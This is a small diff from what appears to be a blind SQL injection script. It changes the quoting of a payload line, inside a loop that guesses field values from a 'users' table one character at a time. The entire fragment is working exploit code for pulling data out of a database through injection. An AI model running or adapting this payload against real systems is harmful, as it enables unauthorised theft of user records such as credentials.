@@ -20,7 +20,7 @@ def extract_field(row_index, field_name):
             # Skip chars that break SQL syntax
             if ch in ('"', '\\'):
                 continue
-            payload = f"' OR SUBSTRING((SELECT {field_name} FROM users LIMIT {row_index},1),{pos},1)='{ch}' -- "
+            payload = f"""' OR SUBSTRING((SELECT {field_name} FROM users LIMIT {row_index},1),{pos},1)='{ch}' -- """
             if check(payload):
                 result += ch
                 found_char = True
